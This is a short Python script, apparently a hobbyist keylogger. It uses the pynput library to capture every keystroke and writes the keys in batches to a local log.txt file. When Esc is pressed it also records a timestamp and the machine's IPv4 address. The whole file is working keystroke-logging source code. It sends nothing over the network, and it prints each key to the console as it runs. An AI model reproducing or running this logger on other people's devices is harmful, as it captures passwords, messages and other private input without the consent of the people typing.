import pynput
import socket
import os
from pynput.keyboard import Key, Listener
from datetime import datetime

hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)

count = 0
keys = []

now = datetime.now()
current_time = now.strftime(str("[%Y-%m-%d %H:%M:%S]")) 

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1

    # Anything under 20 records hella slow
    if count >= 20:
        count = 0
        write_file(keys)
        keys = []
        print("Count = 20")

    print("{0} pressed".format(key))

# Open log.txt and store keys
def write_file(keys):
    with open(r"./log.txt", "a") as f:
        #Loop through keys and append them to the file
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
                f.flush()
            elif k.find("enter") > 0:
                f.write('\n')
                f.flush()
            elif k.find("tab") > 0:
                f.write('\n')
                f.flush()
            elif k.find("Key") == -1:
                f.write(k)
                f.flush()
            #elif k.find(str('@gmail.com' '@outlook.com' '@hotmail.com' '@yahoo.com')):
            #    f.write("[e-mail detected]")
                

def on_release(key):
    if key == Key.esc:
        write_file('\n')
        write_file('\n')
        write_file(current_time)
        write_file('\n')
        write_file("IPv4: ")
        write_file(ip)
        write_file('\n')
        write_file('\n')
        print("Current Time Recorded!")
        print("IPv4 Recorded!")
        print("End of keylog . . . ")
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    # Constantly keep running this loop until it breaks
    listener.join()